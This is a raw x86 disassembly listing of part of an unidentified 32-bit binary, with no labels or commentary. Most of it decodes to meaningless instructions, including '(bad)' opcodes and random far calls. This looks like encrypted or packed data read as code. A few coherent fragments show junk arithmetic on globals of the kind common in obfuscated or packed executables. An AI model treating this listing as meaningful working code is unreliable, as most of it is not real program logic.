  40723f:	pop    ebx
  407240:	mov    ch,0xcc
  407242:	sbb    ecx,DWORD PTR ds:0xc26f31b0
  407248:	push   edx
  407249:	jbe    0x407208
  40724b:	dec    edi
  40724c:	inc    eax
  40724d:	xor    BYTE PTR [ebp+0x34c185d0],ah
  407253:	(bad)  
  407255:	push   ebx
  407256:	stc    
  407257:	lods   al,BYTE PTR ds:[esi]
  407258:	add    BYTE PTR [ebp-0x7e],0xf0
  40725c:	or     al,0xa2
  40725e:	pop    es
  40725f:	scas   eax,DWORD PTR es:[edi]
  407260:	je     0x40721e
  407262:	dec    ecx
  407263:	sub    eax,0x89d63f6e
  407268:	mov    ebx,0x14573afa
  40726d:	adc    dh,ch
  40726f:	js     0x407226
  407271:	mov    ebp,0x98afb0ee
  407276:	das    
  407277:	test   al,0x98
  407279:	repnz inc esi
  40727b:	cwde   
  40727c:	outs   dx,BYTE PTR ds:[esi]
  40727d:	push   esp
  40727e:	mov    dl,0x6d
  407280:	pusha  
  407281:	and    al,0xf8
  407283:	jo     0x407303
  407285:	push   esi
  407286:	sub    al,0xd8
  407289:	mov    WORD PTR [edx+0x306a59c1],cs
  40728f:	xchg   esp,eax
  407290:	imul   ebx,DWORD PTR [edx],0xffffffb5
  407293:	mov    ecx,0xcf4b1b97
  407298:	jns    0x40725f
  40729a:	lea    eax,[edx+0x4dfe01f4]
  4072a0:	cmp    al,0x98
  4072a2:	jbe    0x407263
  4072a4:	cmc    
  4072a5:	jg     0x4072ad
  4072a7:	dec    eax
  4072a8:	clc    
  4072a9:	iret   
  4072aa:	fwait
  4072ab:	outs   dx,BYTE PTR ds:[esi]
  4072ac:	call   0xa765:0x1a554d6f
  4072b3:	jmp    0xe846aefd
  4072b8:	xor    BYTE PTR [eax+0x5b36e568],al
  4072be:	jge    0x407309
  4072c0:	fmul   DWORD PTR [edi+0x7f]
  4072c3:	into   
  4072c4:	loope  0x4072f4
  4072c6:	jg     0x407332
  4072c8:	add    edx,ecx
  4072ca:	inc    eax
  4072cb:	push   ecx
  4072cc:	pusha  
  4072cd:	repnz sti 
  4072cf:	scas   al,BYTE PTR es:[edi]
  4072d0:	ins    DWORD PTR es:[edi],dx
  4072d1:	add    ch,al
  4072d3:	repz pop esi
  4072d5:	cmp    eax,0xffffffe0
  4072d8:	test   BYTE PTR [eax-0x29b7c327],0xb5
  4072df:	ret    
  4072e0:	fild   WORD PTR [edx]
  4072e2:	rcr    BYTE PTR [esi+0x51653a0d],cl
  4072e8:	pop    edi
  4072e9:	ror    DWORD PTR [ebp+0x1ef4dbca],1
  4072ef:	sbb    DWORD PTR [eax+ebx*2-0x7e],ecx
  4072f3:	sub    dl,dl
  4072f5:	xchg   ebx,eax
  4072f6:	mov    ds:0xe8710d9d,al
  4072fb:	fstp   QWORD PTR [eax+0x5c]
  4072fe:	xor    bh,bl
  407300:	(bad)  
  407301:	dec    esp
  407302:	outs   dx,DWORD PTR ds:[esi]
  407303:	das    
  407304:	sbb    eax,0x36f75d84
  407309:	pop    ds
  40730a:	(bad)  
  40730b:	mov    fs,WORD PTR [ebp+0x7a69992e]
  407311:	aas    
  407312:	xor    edi,DWORD PTR [edx+0x1c]
  407315:	hlt    
  407316:	jbe    0x4072e2
  407318:	cmp    DWORD PTR [ecx-0x38ec9655],ecx
  40731e:	clc    
  40731f:	test   al,0xfc
  407321:	mov    ebp,0x99e57fe8
  407326:	in     eax,dx
  407327:	pop    edx
  407328:	retf   
  407329:	dec    ebp
  40732a:	fcmovnb st,st(3)
  40732c:	mov    edx,DWORD PTR [eax-0xb]
  40732f:	pushf  
  407330:	enter  0x85e8,0xac
  407334:	test   al,0x18
  407336:	scas   al,BYTE PTR es:[edi]
  407337:	data16 int3 
  407339:	in     al,0x2e
  40733b:	jmp    0x40735d
  40733d:	repz fiadd WORD PTR [edx]
  407340:	ret    
  407341:	idiv   BYTE PTR [esi]
  407343:	cmp    BYTE PTR [ebx+0x66],ch
  407346:	fimul  DWORD PTR [ebx+0x581f445]
  40734c:	sar    esp,1
  40734e:	inc    edx
  40734f:	add    BYTE PTR [ebx],al
  407351:	out    0x42,eax
  407353:	add    BYTE PTR [ebx],dh
  407355:	mov    BYTE PTR [ecx+0x42fcfd05],0x0
  40735c:	not    BYTE PTR [edi+0x0]
  40735f:	add    BYTE PTR [ebx],al
  407361:	mov    DWORD PTR [ecx+0x42e70f35],0x2a1100
  40736b:	add    BYTE PTR [ecx+0x45c7e845],cl
  407371:	in     al,0x3c
  407373:	test   DWORD PTR [eax+edi*8+0x67ff45c6],ebx
  40737a:	and    DWORD PTR ds:0x42fcfd,0x0
  407384:	mov    eax,ds:0x42fcfd
  407389:	inc    eax
  40738a:	mov    ds:0x42fcfd,eax
  40738f:	cmp    DWORD PTR ds:0x42fcfd,0xe
  407396:	jne    0x4073a2
  40739c:	call   DWORD PTR ds:0x42e45f
  4073a2:	cmp    DWORD PTR ds:0x42fcfd,0xd
  4073a9:	jne    0x4073ba
  4073af:	mov    eax,ds:0x42fcfd
  4073b4:	inc    eax
  4073b5:	mov    ds:0x42fcfd,eax
  4073ba:	cmp    DWORD PTR ds:0x42fcfd,0x1d
  4073c1:	jb     0x407384
  4073c7:	mov    eax,DWORD PTR [ebp-0xc]
  4073ca:	xor    eax,esi
  4073cc:	and    DWORD PTR ds:0x42e128,0xdb
  4073d6:	add    eax,edi
  4073d8:	or     DWORD PTR ds:0x42e707,0x71a5
  4073e2:	mov    DWORD PTR [ebp-0x18],eax
  4073e5:	adc    eax,0x7137
  4073ea:	jmp    0x407737
  4073ef:	or     DWORD PTR ds:[edi],eax
  4073f2:	(bad)  
  4073f3:	rcl    edx,cl
  4073f5:	cmp    DWORD PTR [ecx],edx
  4073f7:	pop    ecx
  4073f8:	jns    0x4073c5
  4073fa:	popa   
  4073fb:	cmp    DWORD PTR [ebx-0x3008aef4],edx
  407401:	jo     0x407473
  407403:	and    BYTE PTR [ebp+0x70],bh
  407406:	jo     0x40739b
  407408:	adc    al,0x73
  40740a:	(bad)  
  40740b:	lea    ecx,[ebp-0x7f]
  40740e:	xlat   BYTE PTR ds:[ebx]
  40740f:	imul   BYTE PTR [ecx+0x45]
  407412:	nop
  407413:	mov    bh,0x4e
  407415:	test   eax,0xac400965
  40741a:	sbb    BYTE PTR [ecx+0x57],al
  40741d:	ds nop
  40741f:	or     BYTE PTR ds:0x57ff6b42,ah
  407425:	push   ebp
  407426:	mov    ds,WORD PTR [edi+0x68]
  407429:	je     0x4073b8
  40742b:	xor    dh,bl
  40742d:	das    
  40742e:	call   0x4ce87387
  407433:	aas    
  407434:	stc    
  407435:	mov    edi,0xb98609cc
  40743a:	outs   dx,BYTE PTR ds:[esi]
  40743b:	(bad)  
  40743c:	mov    bh,0x69
  40743e:	or     al,0xd9
  407440:	cmp    bh,BYTE PTR [edx+ecx*4-0x77]
  407444:	ret    
  407445:	jp     0x4074b0
  407447:	or     esp,edi
  407449:	scas   eax,DWORD PTR es:[edi]
  40744a:	xor    DWORD PTR [ebx],eax
  40744c:	int    0x6c
  40744e:	jmp    0x40744f
  407450:	outs   dx,DWORD PTR ds:[esi]
  407451:	jmp    0x40744f
  407453:	xchg   edx,eax
  407454:	je     0x4074bd
  407456:	or     eax,0x8722484e
  40745b:	and    dh,al
  40745d:	idiv   DWORD PTR [eax+0x3c]
  407460:	dec    esi
  407461:	dec    esp
  407462:	mov    ds:0xb8115084,eax
  407467:	and    ebp,ebx
  407469:	pop    edx
  40746a:	aaa    
  40746b:	outs   dx,BYTE PTR ds:[esi]
  40746c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40746d:	xor    esp,eax
  40746f:	lahf   
  407470:	jp     0x4073ff
  407472:	cmp    ch,dh
  407474:	arpl   WORD PTR [ebp-0x66705b41],si
  40747a:	xchg   ebp,eax
  40747b:	mov    DWORD PTR [eax+0x5737f0f1],esp
  407481:	push   0xdf27e258
  407486:	mov    BYTE PTR [ebx],bh
  407488:	test   BYTE PTR [ebx+0x50],bh
  40748b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40748c:	dec    esp
  40748d:	std    
  40748e:	pop    eax
  40748f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407490:	adc    BYTE PTR [ecx],0xc1
  407493:	add    al,0x2c
  407495:	mov    ah,dh
  407497:	sub    cl,BYTE PTR [esi-0x4cc3605c]
  40749d:	or     ebx,edi
  40749f:	jl     0x4074b9
  4074a1:	cmp    eax,0xebc6c041
  4074a6:	fsubr  DWORD PTR [ecx-0x18]
  4074a9:	or     eax,0xc0143ad8
  4074ae:	mov    ebx,0xe4b0137a
  4074b3:	sti    
  4074b4:	sub    DWORD PTR [edx+0x44],ecx
  4074b7:	clc    
  4074b8:	or     BYTE PTR [esi+ebp*4+0x4eda7194],cl
  4074bf:	bnd jb 0x4074ab
  4074c2:	add    BYTE PTR [edx-0x80],ch
  4074c5:	std    
  4074c6:	mov    ah,0xf9
  4074c8:	and    al,0x4c
  4074ca:	jmp    0x40754a
  4074cc:	or     dl,0x28
  4074cf:	xor    eax,0xa9ce5f3
  4074d4:	mov    ds:0xaa34468,eax
  4074d9:	push   eax
  4074da:	push   esi
  4074db:	aam    0x54
  4074dd:	add    edi,DWORD PTR ds:0x7c25d775
  4074e3:	mov    ds:0x3fdaf15d,al
  4074e8:	and    BYTE PTR [edi+edi*8-0x4a],dl
  4074ec:	mov    WORD PTR [ebx-0x2b4f3070],ss
  4074f2:	xchg   esi,eax
  4074f3:	cli    
  4074f4:	xchg   ebx,eax
  4074f5:	enter  0x8ac2,0xdc
  4074f9:	sbb    dl,BYTE PTR [esi]
  4074fb:	mov    dh,0xeb
  4074fd:	add    BYTE PTR [ecx-0x3c4a34fb],ah
  407503:	outs   dx,DWORD PTR ds:[esi]
  407504:	mov    bh,0x50
  407506:	pusha  
  407507:	sti    
  407508:	inc    eax
  407509:	and    al,0xc8
  40750b:	mov    ds:0xdefdd30c,eax
  407510:	loop   0x407506
  407512:	and    DWORD PTR [eax+ebx*2-0xfd63c0b],ecx
  407519:	addr16 lahf 
  40751b:	pop    ss
  40751c:	sub    eax,0xa8ee103a
  407521:	pop    es
  407522:	or     al,0x6f
  407524:	sub    al,0xaf
  407526:	add    BYTE PTR [ebx],cl
  407528:	mov    dl,0x83
  40752a:	bound  ecx,QWORD PTR [ebp-0x52]
  40752d:	push   cs
  40752e:	xor    cl,ah
  407530:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407531:	outs   dx,DWORD PTR ds:[esi]
  407532:	mov    eax,ds:0xc6dc65be
  407537:	push   ds
  407538:	jp     0x407561
  40753a:	hlt    
  40753b:	loop   0x407576
  40753d:	inc    esp
  40753e:	stc    
  40753f:	adc    edx,ecx
  407541:	call   0x87d02b9f
  407546:	adc    al,0xc6
  407548:	pop    ecx
  407549:	das    
  40754a:	jl     0x407595
  40754c:	or     edi,DWORD PTR [edx]
  40754e:	push   edx
  40754f:	retf   
  407550:	scas   eax,DWORD PTR es:[edi]
  407551:	pop    ds
  407552:	mov    cl,BYTE PTR [ebx+0x39]
  407555:	sub    edi,esp
  407557:	pusha  
  407558:	dec    ecx
  407559:	mov    ebx,DWORD PTR [ebp-0x39ba651b]
  40755f:	mov    ds:0x92b4b2ad,al
  407564:	mov    esp,0x921c6cb9
  407569:	mov    ds:0x55553275,al
  40756e:	int    0xd5
  407570:	add    ebx,DWORD PTR [ecx+0x1d]
  407573:	mov    esp,0x6a0fc9bc
  407578:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407579:	inc    ecx
  40757a:	shl    DWORD PTR [ebx-0x4b248606],0x48
  407581:	leave  
  407582:	sub    BYTE PTR fs:[ecx-0x6d3bd53f],0x2e
  40758a:	add    edi,ecx
  40758c:	add    bh,BYTE PTR [ebx+edi*4+0x73b6188e]
  407593:	(bad)  
  407594:	push   esi
  407595:	not    DWORD PTR [edx-0x76d2f363]
  40759b:	push   ebx
  40759c:	push   edx
  40759d:	ins    BYTE PTR es:[edi],dx
  40759e:	sub    eax,0x84392c61
  4075a3:	loopne 0x40756c
  4075a5:	inc    ebp
  4075a6:	nop
  4075a7:	cmp    dh,cl
  4075a9:	fnstenv es:[edx-0x705da521]
  4075b0:	xchg   esi,eax
  4075b1:	jmp    0x3c2f7707
  4075b6:	cmp    ah,BYTE PTR [edx+esi*4+0x20ad1bbe]
  4075bd:	or     al,BYTE PTR [ecx+0x470a4af6]
  4075c3:	int    0x4
  4075c5:	stos   DWORD PTR es:[edi],eax
  4075c6:	fbld   TBYTE PTR [esi-0x6d]
  4075c9:	mov    eax,0xeae9f708
  4075ce:	xor    bl,bl
  4075d0:	cmp    ah,BYTE PTR [ecx-0x3f14f1fc]
  4075d6:	outs   dx,DWORD PTR ds:[esi]
  4075d7:	adc    eax,0x35ada46c
  4075dc:	das    
  4075dd:	adc    esp,esp
  4075df:	lahf   
  4075e0:	clc    
  4075e1:	test   DWORD PTR [edi],ebp
  4075e3:	mov    dh,BYTE PTR [ebx+0x66b502ed]
  4075e9:	retf   0x6bdf
  4075ec:	add    ebp,DWORD PTR [eax+0x2ea65083]
  4075f2:	jne    0x407605
  4075f4:	mov    ebx,0x3416cc3e
  4075f9:	es cmp al,0xf5
  4075fc:	pop    ecx
  4075fd:	push   esp
  4075fe:	cmp    ch,BYTE PTR [eax]
  407600:	fdiv   st,st(3)
  407602:	clc    
  407603:	fadd   QWORD PTR [ecx+0xe]
  407606:	add    eax,eax
  407608:	push   esi
  407609:	push   ebp
  40760a:	inc    ebx
  40760b:	mov    edi,?
  40760d:	adc    BYTE PTR [ebx],cl
  40760f:	pop    edi
  407610:	scas   al,BYTE PTR es:[edi]
  407611:	push   ebx
  407612:	add    ah,BYTE PTR [esi-0x9ca63dc]
  407618:	mov    DWORD PTR [ecx+0xb8f02a4],ebx
  40761e:	adc    DWORD PTR [ebp+0x19],edx
  407621:	inc    esi
  407622:	ds mov cl,0x2e
  407625:	push   ebx
  407626:	inc    ebx
  407627:	add    eax,0xc2ae2e7c
  40762c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40762d:	push   esp
  40762e:	lods   eax,DWORD PTR ds:[esi]
  40762f:	into   
  407630:	jmp    0x4075f8
  407632:	inc    ebx
  407633:	push   edx
  407634:	or     dl,BYTE PTR [edi-0x1d]
  407637:	dec    BYTE PTR [ebx+0x79]
  40763a:	loop   0x407692
  40763c:	mov    ss,WORD PTR ds:0x8128b2d
  407642:	cs and eax,0x7ecc2005
  407648:	pop    ss
  407649:	push   edi
  40764a:	dec    edi
  40764b:	push   edx
  40764c:	pop    esi
  40764d:	std    
  40764e:	rol    BYTE PTR [ebp+0x6],1
  407651:	cmc    
  407652:	test   ah,ch
  407654:	rcr    DWORD PTR [edi],cl
  407656:	inc    edx
  407657:	mov    DWORD PTR [edx],ebx
  407659:	push   ebx
  40765a:	push   ss
  40765b:	fwait
  40765c:	inc    eax
  40765d:	mov    ah,0x82
  40765f:	inc    edi
  407660:	and    DWORD PTR [edi+ecx*1+0x48d33e74],edx
  407667:	mov    cl,0xf
  407669:	stos   BYTE PTR es:[edi],al
  40766a:	fnsave [ecx]
  40766c:	adc    esp,DWORD PTR [edx+eax*8-0x7]
  407670:	or     dh,ah
  407672:	add    eax,0xcf9072b5
  407677:	fsubr  DWORD PTR [eax+0x30]
  40767a:	pusha  
  40767b:	pop    ss
  40767c:	repz cmp BYTE PTR [eax-0x1dfde28f],cl
  407683:	adc    eax,0xa6f65eb9
  407688:	add    ebp,esp
  40768a:	jno    0x407693
  40768c:	cmp    al,0x5c
  40768e:	push   esp
  40768f:	xor    al,0xa4
  407691:	in     eax,dx
  407692:	xor    al,0x90
  407694:	bound  ebp,QWORD PTR [ecx+0x4d]
  407697:	enter  0x89e1,0xb3
  40769b:	xor    BYTE PTR [eax+0x3e],al
  40769e:	clc    
  40769f:	outs   dx,DWORD PTR ds:[esi]
  4076a0:	inc    eax
  4076a1:	jne    0x4076b7
  4076a3:	dec    eax
  4076a4:	xor    DWORD PTR [edx],edi
  4076a6:	loop   0x4076fc
  4076a8:	pusha  
  4076a9:	add    ebp,DWORD PTR [eax+0x4a]
  4076ac:	pop    ecx
  4076ad:	sbb    al,bl
  4076af:	(bad)  
  4076b0:	mov    eax,0xe0d09b35
  4076b5:	test   BYTE PTR [esp+esi*4+0x77],dl
  4076b9:	shl    DWORD PTR [ebp+0x6e513e70],cl
  4076bf:	cmp    DWORD PTR [ebp-0x2e],esp
  4076c2:	fwait
  4076c3:	loope  0x407671
  4076c5:	adc    BYTE PTR ds:0x63001a78,dh
  4076cb:	xchg   edi,eax
  4076cc:	jns    0x40766f
  4076ce:	data16 add cl,BYTE PTR [esi+eiz*8-0x73]
  4076d3:	inc    ebp
  4076d4:	jae    0x4076d1
  4076d6:	jg     0x4076be
  4076d8:	xor    eax,0x64b83c11
  4076dd:	and    DWORD PTR [ebp+0x1a],esi
  4076e0:	scas   al,BYTE PTR es:[edi]
  4076e1:	(bad)  [eax]
  4076e3:	inc    edi
  4076e4:	adc    al,0x23
  4076e6:	repnz and cl,BYTE PTR [esi+ebx*1-0x4f89220a]
  4076ee:	cmp    ecx,0xffffff89
  4076f1:	mov    ds:0xc0d92736,eax
  4076f6:	push   es
  4076f7:	inc    ebx
  4076f8:	jmp    FWORD PTR [esi+0x5a]
  4076fb:	jmp    0x5f07bf66
  407700:	iret   
  407701:	sbb    eax,0x752d57e1
  407706:	dec    eax
  407707:	or     eax,0x85122c91
  40770c:	pop    esi
  40770d:	(bad)  [ebx+ebx*1+0x13]
  407711:	outs   dx,DWORD PTR ds:[esi]
  407712:	push   edi
  407713:	cmp    DWORD PTR [ebp+esi*4-0x29],esp
  407717:	test   eax,0x9e3e629b
  40771c:	stos   DWORD PTR es:[edi],eax
  40771d:	cmp    BYTE PTR [esi+0x5ef1d300],bh
  407723:	fadd   st,st(5)
  407725:	sub    DWORD PTR [ebx+0x36],esp
  407728:	pop    ebx
  407729:	pop    edi
  40772a:	mov    DWORD PTR [edx+0x1581b5c7],edi
  407730:	adc    BYTE PTR [eax+0x2f],ch
  407733:	adc    eax,0x8b57fb19
  407738:	inc    ebp
  407739:	fdiv   QWORD PTR [ebx]
  40773b:	mov    BYTE PTR [ebx],0xc7
  40773e:	adc    DWORD PTR ds:0x42e11c,0x42fd09
  407748:	push   eax
  407749:	inc    eax
  40774a:	mov    eax,DWORD PTR [ebp-0x28]
  40774d:	sbb    DWORD PTR ds:0x42fcd1,0x6777
  407757:	xor    eax,esi
  407759:	add    eax,edi
  40775b:	push   eax
  40775c:	mov    eax,DWORD PTR [ebp-0x1c]
  40775f:	or     DWORD PTR ds:0x42e6ef,0x4a3f
  407769:	xor    eax,esi
  40776b:	add    DWORD PTR ds:0x42fcf1,0x266c
  407775:	add    eax,edi
  407777:	xor    DWORD PTR ds:0x42e70f,0x42e6eb
  407781:	push   eax
  407782:	lea    eax,[ebp-0x78]
  407785:	push   eax
  407786:	add    DWORD PTR ds:0x42e6ff,0x5eb6
  407790:	push   DWORD PTR [ebp-0xc]
  407793:	adc    DWORD PTR ds:0x42e703,0x2bbb
  40779d:	push   DWORD PTR [ebp-0x14]
  4077a0:	call   0x405e60
  4077a5:	adc    DWORD PTR ds:0x42fce5,0x42fd6e
  4077af:	test   eax,eax
  4077b1:	je     0x407e83
  4077b7:	lea    eax,[ebp-0x78]
  4077ba:	sbb    DWORD PTR ds:0x42fd82,0x6660
  4077c4:	push   eax
  4077c5:	mov    eax,DWORD PTR [ebp-0x14]
  4077c8:	jmp    0x407b15
  4077cd:	xlat   BYTE PTR ds:[ebx]
  4077ce:	and    BYTE PTR [eax+eiz*8+0x73],ch
  4077d2:	ins    BYTE PTR es:[edi],dx
  4077d3:	push   ebx
  4077d4:	aaa    
  4077d5:	pop    edx
  4077d6:	push   ecx
  4077d7:	push   ebx
  4077d8:	sahf   
  4077d9:	imul   eax,DWORD PTR [esi-0x5f],0xffffffed
  4077dd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4077de:	int3   
  4077df:	jo     0x407851
  4077e1:	and    BYTE PTR [ebp+0x70],bh
  4077e4:	jo     0x40779c
  4077e6:	jecxz  0x4077bb
  4077e8:	(bad)  
  4077e9:	xor    eax,0x87cc179b
  4077ee:	js     0x4077bd
  4077f0:	mov    bl,0xbc
  4077f2:	ret    0xb228
  4077f5:	call   0x1285:0xb1b135d9
  4077fc:	ins    DWORD PTR es:[edi],dx
  4077fd:	xchg   ebp,eax
  4077fe:	inc    ecx
  4077ff:	fisubr WORD PTR [esi+0x22]
  407802:	ja     0x4077f6
  407804:	xchg   edx,eax
  407805:	mov    bl,dh
  407807:	sbb    bl,BYTE PTR [edi+0x40]
  40780a:	dec    ebp
  40780b:	(bad)  
  40780c:	cmc    
  40780d:	jbe    0x4077fa
  40780f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407810:	mov    eax,0x962380b
  407815:	mov    ds:0x60dbf9fd,al
  40781a:	aas    
  40781b:	loope  0x4077fd
  40781d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40781e:	outs   dx,BYTE PTR ds:[esi]
  40781f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407820:	cs cmp cl,dl
  407823:	push   esp
  407824:	xor    ebp,edi
  407826:	jp     0x4077bd
  407828:	and    edx,DWORD PTR [edi+0x6]
  40782b:	inc    esp
  40782c:	ins    DWORD PTR es:[edi],dx
  40782d:	test   DWORD PTR [eax+0x72],0xabea3af2
  407834:	daa    
  407835:	out    0x3a,al
  407837:	icebp  
  407838:	fistp  QWORD PTR [eax]
  40783a:	inc    edi
  40783b:	imul   esp,ecx,0x78
  40783e:	xor    BYTE PTR [edi+0x4de5e22],al
  407844:	fucomip st,st(5)
  407846:	aad    0xd5
  407848:	push   eax
  407849:	adc    cl,ah
  40784b:	sahf   
  40784c:	push   edi
  40784d:	shr    al,0x8
  407850:	push   es
  407851:	and    BYTE PTR [ebx+ecx*2],ah
  407854:	in     eax,dx
  407855:	in     al,dx
  407856:	pop    edi
  407857:	addr16 mov esi,0x4d0ee6f9
  40785d:	jg     0x407891
  40785f:	bound  edx,QWORD PTR [esi+0x8]
  407862:	pusha  
  407863:	add    edi,DWORD PTR [edi-0x17]
  407866:	fwait
  407867:	sbb    ecx,DWORD PTR [edi+0x65cb60c8]
  40786d:	inc    ebp
  40786e:	pop    ss
  40786f:	in     eax,0xee
  407871:	adc    eax,0xc64f9402
  407876:	into   
  407877:	xchg   edi,eax
  407878:	jmp    0x3f10de98
  40787d:	mov    cl,BYTE PTR [esi-0x13]
  407880:	mov    ch,0x28
  407882:	icebp  
  407883:	div    BYTE PTR [ebp+0x4f]
  407886:	pop    ds
  407887:	not    DWORD PTR [eax-0x44]
  40788a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40788b:	pop    eax
  40788c:	jne    0x40788e
  40788e:	pop    ecx
  40788f:	add    al,0xe6
  407891:	test   DWORD PTR [ecx],esi
  407893:	jp     0x407815
  407895:	push   ebp
  407896:	xor    BYTE PTR [edi-0x5b],al
  407899:	(bad)  [ebx]
  40789b:	fsubr  st,st(5)
  40789d:	fstp   QWORD PTR [ebx]
  40789f:	hlt    
  4078a0:	lods   al,BYTE PTR ds:[esi]
  4078a1:	jg     0x4078d3
  4078a3:	add    al,0x88
  4078a5:	adc    al,0x81
  4078a7:	ret    0x7da7
  4078aa:	dec    edi
  4078ab:	cld    
  4078ac:	sub    esi,0x89da690f
  4078b2:	test   al,0xe0
  4078b4:	add    DWORD PTR [esi],0x73067913
  4078ba:	into   
  4078bb:	popw   es
  4078bd:	push   ss
  4078be:	lods   al,BYTE PTR ds:[esi]
  4078bf:	push   cs
  4078c0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4078c1:	call   0x22289491
  4078c6:	adc    cx,si
  4078c9:	clc    
  4078ca:	into   
  4078cb:	scas   eax,DWORD PTR es:[edi]
  4078cc:	aam    0x8d
  4078ce:	enter  0x427c,0x93
  4078d2:	push   ecx
  4078d3:	mov    esp,0xe244e633
  4078d8:	and    eax,eax
  4078da:	xchg   ebx,eax
  4078db:	push   ss
  4078dc:	ins    BYTE PTR es:[edi],dx
  4078dd:	jge    0x4078c9
  4078df:	xchg   ebp,eax
  4078e0:	cmp    DWORD PTR [esi],ecx
  4078e2:	fimul  WORD PTR ds:0x962f6343
  4078e8:	ret    0x6a36
  4078eb:	outs   dx,BYTE PTR ds:[esi]
  4078ec:	aad    0x6a
  4078ee:	loop   0x4078db
  4078f0:	lods   al,BYTE PTR ds:[esi]
  4078f1:	push   es
  4078f2:	sbb    eax,edx
  4078f4:	cmc    
  4078f5:	das    
  4078f6:	in     eax,dx
  4078f7:	add    eax,0x3d66937d
  4078fc:	mov    DWORD PTR ds:0x730259f,edi
  407902:	sub    ecx,DWORD PTR [ebx-0x2bd47412]
  407908:	or     esp,eax
  40790a:	mov    ds:0x1d79e4d8,eax
  40790f:	jno    0x4078f1
  407911:	imul   DWORD PTR [ebp+0x12]
  407914:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407915:	adc    ah,BYTE PTR [edi-0x2d]
  407918:	mov    eax,0xeb324f50
  40791d:	mov    dh,0xb0
  40791f:	adc    DWORD PTR [ebp+0x37],ebp
  407922:	cwde   
  407923:	(bad)  
  407924:	sbb    dl,bl
  407926:	or     BYTE PTR [ecx-0x402c0bb2],cl
  40792c:	xor    DWORD PTR [ecx],ebp
  40792e:	xchg   esp,eax
  40792f:	adc    ecx,ebp
  407931:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407932:	xchg   BYTE PTR [edx+0x49],dl
  407935:	dec    ecx
  407936:	repz std 
  407938:	xor    ebp,DWORD PTR ds:0x4c384b9e
  40793e:	stos   BYTE PTR es:[edi],al
  40793f:	jg     0x407954
  407941:	cmp    eax,0xd42a9d9a
  407946:	mov    eax,ds:0xa3b8eb16
  40794b:	bound  esi,QWORD PTR [ebp-0x70]
  40794e:	hlt    
  40794f:	lea    esp,[ebx-0x77774666]
  407955:	test   eax,0xabe12ab2
  40795a:	out    0xb,al
  40795c:	adc    dl,cl
  40795e:	push   ecx
  40795f:	mov    ds:0xe4485bf2,al
  407964:	fwait
  407965:	test   al,0x80
  407967:	sub    ch,al
  407969:	retf   
  40796a:	jnp    0x40795e
  40796c:	call   0x4c4e:0x9817ab6e
  407973:	dec    edx
  407974:	push   0xffffffd7
  407976:	dec    edx
  407977:	jp     0x407931
  407979:	or     bl,BYTE PTR [eax-0x2f8f6a46]
  40797f:	rcr    BYTE PTR [esi-0x218b1449],0x0
  407986:	adc    eax,0x499716f1
  40798b:	jge    0x407985
  40798d:	in     al,dx
  40798e:	and    ch,cl
  407990:	int    0xa5
  407992:	cli    
  407993:	ret    0xb899
  407996:	inc    esi
  407997:	ret    
  407998:	sbb    ebp,DWORD PTR [edx+0x27479a7b]
  40799e:	outs   dx,BYTE PTR ds:[esi]
  40799f:	imul   esi,DWORD PTR [ebp+0xd519253],0x8a2652de
  4079a9:	ss js  0x40796b
  4079ac:	repz (bad) 
  4079ae:	rcr    dh,cl
  4079b0:	xor    dl,BYTE PTR [edi-0x52002c9a]
  4079b6:	enter  0x1ce8,0x87
  4079ba:	out    0x2b,al
  4079bc:	(bad)  
  4079be:	add    al,0x65
  4079c0:	xor    eax,0xc59d8a13
  4079c5:	das    
  4079c6:	cmp    bl,BYTE PTR [eax+0x67]
  4079c9:	sub    al,0x8e
  4079cb:	scas   eax,DWORD PTR es:[edi]
  4079cc:	push   edx
  4079cd:	in     eax,0xc5
  4079cf:	adc    edi,DWORD PTR [eax+ebx*4-0x2]
  4079d3:	xlat   BYTE PTR ds:[ebx]
  4079d4:	(bad)  
  4079d6:	mov    ebp,0xef84dd56
  4079db:	mov    BYTE PTR [eax-0x4f89e3c4],cl
  4079e1:	jecxz  0x407a0b
  4079e3:	leave  
  4079e4:	push   0xfffffff9
  4079e6:	icebp  
  4079e7:	ror    dl,1
  4079e9:	stc    
  4079ea:	or     DWORD PTR ds:0xdc4afb9e,0x315ee1bc
  4079f4:	and    DWORD PTR [ecx],esp
  4079f6:	ret    
  4079f7:	fucomip st,st(6)
  4079f9:	xor    eax,0x6ac92143
  4079fe:	jne    0x407a16
  407a00:	test   al,al
  407a02:	add    DWORD PTR [ebp+0x6a],0x16eee185
  407a09:	clc    
  407a0a:	lds    edx,FWORD PTR [eax-0x18]
  407a0d:	mov    esi,0xcfc23be9
  407a12:	or     esp,DWORD PTR [eax]
  407a14:	push   es
  407a15:	xor    eax,DWORD PTR [ebx]
  407a17:	sub    dl,BYTE PTR [ebx-0x6e79428]
  407a1d:	dec    edi
  407a1e:	xor    edx,DWORD PTR [ecx-0x57]
  407a21:	jbe    0x407a3a
  407a23:	repnz mov DWORD PTR [edi+edx*1+0x418509e],esp
  407a2b:	mov    bp,0x272c
  407a2f:	sahf   
  407a30:	test   eax,0xcc1fe941
  407a35:	add    ebx,DWORD PTR [esi]
  407a37:	int    0xec
  407a39:	daa    
  407a3a:	and    al,0xf2
  407a3c:	out    dx,eax
  407a3d:	test   eax,0x62cfa653
  407a42:	mov    WORD PTR [eax+0x3f7378be],ss
  407a48:	xor    BYTE PTR ds:0xdad1025b,ah
  407a4e:	call   0x54f7:0x1c56bf6e
  407a55:	inc    edi
  407a56:	pop    eax
  407a57:	dec    ebp
  407a58:	cmp    ah,0x2c
  407a5b:	test   eax,eax
  407a5d:	jmp    0x407a5e
  407a5f:	sbb    al,0x42
  407a61:	les    ebp,FWORD PTR [ecx-0x57f859e2]
  407a67:	ja     0x407aae
  407a69:	cmp    eax,0x1746e7a6
